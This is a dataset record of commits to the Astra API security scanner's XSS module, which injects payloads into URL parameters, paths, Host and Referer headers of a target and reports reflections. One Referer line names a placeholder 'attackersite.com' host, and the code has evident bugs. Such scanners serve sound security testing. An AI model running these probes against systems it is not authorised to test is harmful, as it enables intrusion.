{"https://github.com/flipkart-incubator/Astra": {"351a3ccd8dd6944ebeb0faf902c9de5f21be43b6": {"url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/351a3ccd8dd6944ebeb0faf902c9de5f21be43b6", "html_url": "https://github.com/flipkart-incubator/Astra/commit/351a3ccd8dd6944ebeb0faf902c9de5f21be43b6", "sha": "351a3ccd8dd6944ebeb0faf902c9de5f21be43b6", "keyword": "XSS change", "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 5625f59..26c5de5 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -29,7 +29,8 @@ def fetch_xss_payload():\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+            # Possible XSS \n             impact = \"Low\"\n         else:\n             impact = \"High\"\n@@ -73,19 +74,25 @@ def xss_get_method(url,method,headers,body,scanid=None):\n                         parsed_url = url\n \n                     xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n                     xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n-                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n-                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n-                        impact = check_xss_impact(xss_request_url.headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n+                    if xss_result is True:\n                         print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                         attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                         dbupdate.insert_record(attack_result)\n-           \n+               \n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n def xss_check(url,method,headers,body,scanid):\n     # Main function for XSS attack\n-    xss_payloads = fetch_xss_payload()\n-    xss_get_method(url,method,headers,body,scanid)\n-    xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n+    if method == 'GET' or method == 'DEL':\n+        xss_get_method(url,method,headers,body,scanid)\n+        #xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n", "message": "", "files": {"/modules/xss.py": {"changes": [{"diff": "\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+            # Possible XSS \n             impact = \"Low\"\n         else:\n             impact = \"High\"\n", "add": 2, "remove": 1, "filename": "/modules/xss.py", "badparts": ["        if 'application/json' or 'text/plain'in xss_request['Content-Type']:"], "goodparts": ["        if 'application/json' or 'text/plain' in xss_request['Content-Type']:"]}, {"diff": "\n                         parsed_url = url\n \n                     xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n                     xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n-                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n-                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n-                        impact = check_xss_impact(xss_request_url.headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n+                    if xss_result is True:\n                         print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                         attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                         dbupdate.insert_record(attack_result)\n-           \n+               \n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n def xss_check(url,method,headers,body,scanid):\n     # Main function for XSS attack\n-    xss_payloads = fetch_xss_payload()\n-    xss_get_method(url,method,headers,body,scanid)\n-    xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n+    if method == 'GET' or method == 'DEL':\n+        xss_get_method(url,method,headers,body,scanid)\n+        #xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n", "add": 13, "remove": 7, "filename": "/modules/xss.py", "badparts": ["                    logs.logging.info(\"%s is vulnerable to XSS\",url)", "                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:", "                        impact = check_xss_impact(xss_request_url.headers)", "    xss_payloads = fetch_xss_payload()", "    xss_get_method(url,method,headers,body,scanid)", "    xss_http_headers(url,method,headers,body,scanid)"], "goodparts": ["                    if xss_request_url.text.find(payload) != -1:", "                        impact = check_xss_impact()", "                        xss_result = True", "                    if xss_request_url.text.find(payload) != -1:", "                        impact = check_xss_impact()", "                        xss_result = True", "                    if xss_result is True:", "    if method == 'GET' or method == 'DEL':", "        xss_get_method(url,method,headers,body,scanid)"]}], "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain'in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result=True uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid): xss_payloads=fetch_xss_payload() xss_get_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid) ", "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\ndef xss_get_method(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    result = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        xss_url = url.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                            dbupdate.insert_record(attack_result)\n                            result = True\n\n                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n                    for uri_list in uri_check_list:\n                        if uri_list in url:\n                            # Parse domain name from URI.\n                            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n                            break\n                    if parsed_url == '':\n                        parsed_url = url\n\n                    xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n                        impact = check_xss_impact(xss_request_url.headers)\n                        print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                        attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                        dbupdate.insert_record(attack_result)\n           \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    xss_payloads = fetch_xss_payload()\n    xss_get_method(url,method,headers,body,scanid)\n    xss_http_headers(url,method,headers,body,scanid)"}}, "msg": "changes in xss_get_method function"}, "c7435cdd6357bed9fa1859782a70ad6a7a71125d": {"url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/c7435cdd6357bed9fa1859782a70ad6a7a71125d", "html_url": "https://github.com/flipkart-incubator/Astra/commit/c7435cdd6357bed9fa1859782a70ad6a7a71125d", "sha": "c7435cdd6357bed9fa1859782a70ad6a7a71125d", "keyword": "XSS change", "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 5625f59..26c5de5 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -29,7 +29,8 @@ def fetch_xss_payload():\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+            # Possible XSS \n             impact = \"Low\"\n         else:\n             impact = \"High\"\n@@ -73,19 +74,25 @@ def xss_get_method(url,method,headers,body,scanid=None):\n                         parsed_url = url\n \n                     xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n                     xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n-                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n-                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n-                        impact = check_xss_impact(xss_request_url.headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n+                    if xss_result is True:\n                         print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                         attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                         dbupdate.insert_record(attack_result)\n-           \n+               \n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n def xss_check(url,method,headers,body,scanid):\n     # Main function for XSS attack\n-    xss_payloads = fetch_xss_payload()\n-    xss_get_method(url,method,headers,body,scanid)\n-    xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n+    if method == 'GET' or method == 'DEL':\n+        xss_get_method(url,method,headers,body,scanid)\n+        #xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n", "message": "", "files": {"/modules/xss.py": {"changes": [{"diff": "\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+            # Possible XSS \n             impact = \"Low\"\n         else:\n             impact = \"High\"\n", "add": 2, "remove": 1, "filename": "/modules/xss.py", "badparts": ["        if 'application/json' or 'text/plain'in xss_request['Content-Type']:"], "goodparts": ["        if 'application/json' or 'text/plain' in xss_request['Content-Type']:"]}, {"diff": "\n                         parsed_url = url\n \n                     xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n                     xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n-                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n-                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n-                        impact = check_xss_impact(xss_request_url.headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n+                    if xss_result is True:\n                         print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                         attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                         dbupdate.insert_record(attack_result)\n-           \n+               \n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n def xss_check(url,method,headers,body,scanid):\n     # Main function for XSS attack\n-    xss_payloads = fetch_xss_payload()\n-    xss_get_method(url,method,headers,body,scanid)\n-    xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n+    if method == 'GET' or method == 'DEL':\n+        xss_get_method(url,method,headers,body,scanid)\n+        #xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n", "add": 13, "remove": 7, "filename": "/modules/xss.py", "badparts": ["                    logs.logging.info(\"%s is vulnerable to XSS\",url)", "                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:", "                        impact = check_xss_impact(xss_request_url.headers)", "    xss_payloads = fetch_xss_payload()", "    xss_get_method(url,method,headers,body,scanid)", "    xss_http_headers(url,method,headers,body,scanid)"], "goodparts": ["                    if xss_request_url.text.find(payload) != -1:", "                        impact = check_xss_impact()", "                        xss_result = True", "                    if xss_request_url.text.find(payload) != -1:", "                        impact = check_xss_impact()", "                        xss_result = True", "                    if xss_result is True:", "    if method == 'GET' or method == 'DEL':", "        xss_get_method(url,method,headers,body,scanid)"]}], "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain'in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result=True uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid): xss_payloads=fetch_xss_payload() xss_get_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid) ", "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\ndef xss_get_method(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    result = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        xss_url = url.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                            dbupdate.insert_record(attack_result)\n                            result = True\n\n                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n                    for uri_list in uri_check_list:\n                        if uri_list in url:\n                            # Parse domain name from URI.\n                            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n                            break\n                    if parsed_url == '':\n                        parsed_url = url\n\n                    xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n                        impact = check_xss_impact(xss_request_url.headers)\n                        print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                        attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                        dbupdate.insert_record(attack_result)\n           \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    xss_payloads = fetch_xss_payload()\n    xss_get_method(url,method,headers,body,scanid)\n    xss_http_headers(url,method,headers,body,scanid)"}}, "msg": "changes in xss_get_method function"}, "0ba0637b662761acf042636097913f8fb84df4c7": {"url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/0ba0637b662761acf042636097913f8fb84df4c7", "html_url": "https://github.com/flipkart-incubator/Astra/commit/0ba0637b662761acf042636097913f8fb84df4c7", "sha": "0ba0637b662761acf042636097913f8fb84df4c7", "keyword": "XSS change", "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 36137f2..93dafcb 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -3,6 +3,7 @@\n import sendrequest as req\n import utils.logs as logs\n import urlparse\n+import time\n \n from utils.logger import logger\n from utils.db import Database_update\n@@ -29,7 +30,7 @@ def fetch_xss_payload():\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n             # Possible XSS \n             impact = \"Low\"\n         else:\n@@ -40,9 +41,43 @@ def check_xss_impact(res_headers):\n     return impact\n \n \n+def xss_http_headers(url,method,headers,body,scanid=None):\n+    # This function checks different header based XSS.\n+    # XSS via Host header (Limited to IE)\n+    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n+    temp_headers = {}\n+    temp_headers.update(headers)\n+    xss_payloads = fetch_xss_payload()\n+    for payload in xss_payloads:\n+        parse_domain = urlparse.urlparse(url).netloc\n+        host_header = {\"Host\" : parse_domain + '/' + payload}\n+        headers.update(host_header)\n+        host_header_xss = req.api_request(url, \"GET\", headers)\n+        if host_header_xss.text.find(payload) != -1:\n+            impact = \"Low\"\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n+            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            dbupdate.insert_record(xss_http_headers)\n+            break\n+\n+    # Test for Referer based XSS \n+    for payload in xss_payloads:\n+        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header = {\"Referer\" : referer_header_value}\n+        temp_headers.update(referer_header)\n+        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n+        if ref_header_xss.text.find(payload) != -1:\n+            impact = check_xss_impact(temp_headers)\n+            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n+            dbupdate.insert_record(attack_result)\n+            break\n+\n+\n def xss_get_url(url,method,headers,body,scanid=None):\n-    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n-    xss_result = ''\n+    # Check for URL based XSS. \n+    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n+    result = ''\n     xss_payloads = fetch_xss_payload()\n     uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n     for uri_list in uri_check_list:\n@@ -56,23 +91,24 @@ def xss_get_url(url,method,headers,body,scanid=None):\n \n     for payload in xss_payloads:\n             xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n-            if xss_request_url.text.find(payload) != -1:\n-                impact = check_xss_impact(xss_request_url.headers)\n-                xss_result = True\n+            if result is not True:\n+                if xss_request_url.text.find(payload) != -1:\n+                    impact = check_xss_impact(xss_request_url.headers)\n+                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n+                    dbupdate.insert_record(attack_result)\n+                    result = True\n \n             xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n             if xss_request_url.text.find(payload) != -1:\n                 impact = check_xss_impact()\n-                xss_result = True\n-\n-            if xss_result is True:\n                 print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n-                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n+                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                 dbupdate.insert_record(attack_result)\n-                return\n+                \n \n def xss_get_uri(url,method,headers,body,scanid=None):\n-    # Test for XSS in GET param\n+    # This function checks for URI based XSS. \n+    # http://localhost/?firstname=<payload>&lastname=<payload>\n     db_update = ''\n     vul_param = ''\n     url_query = urlparse.urlparse(url)\n@@ -87,11 +123,9 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n                     # check for URI based XSS\n                     # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                     if result is not True:\n-                        print \"param to test\",key\n                         parsed_url = urlparse.urlparse(url)\n                         xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                         xss_request = req.api_request(xss_url,\"GET\",headers)\n-                        print xss_request.text\n                         if xss_request.text.find(payload) != -1:\n                             impact = check_xss_impact(xss_request.headers)\n                             logs.logging.info(\"%s is vulnerable to XSS\",url)\n@@ -111,7 +145,9 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n-        print \"all params\",vul_param\n+        if vul_param:\n+            # Update all vulnerable params to db.\n+            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n \n \n def xss_check(url,method,headers,body,scanid):\n@@ -119,4 +155,5 @@ def xss_check(url,method,headers,body,scanid):\n     if method == 'GET' or method == 'DEL':\n         xss_get_uri(url,method,headers,body,scanid)\n         xss_get_url(url,method,headers,body,scanid)\n-        #xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n+    \n+    xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n", "message": "", "files": {"/modules/xss.py": {"changes": [{"diff": "\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n             # Possible XSS \n             impact = \"Low\"\n         else:\n", "add": 1, "remove": 1, "filename": "/modules/xss.py", "badparts": ["        if 'application/json' or 'text/plain' in xss_request['Content-Type']:"], "goodparts": ["        if 'application/json' or 'text/plain' in res_headers['Content-Type']:"]}, {"diff": "\n     return impact\n \n \n+def xss_http_headers(url,method,headers,body,scanid=None):\n+    # This function checks different header based XSS.\n+    # XSS via Host header (Limited to IE)\n+    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n+    temp_headers = {}\n+    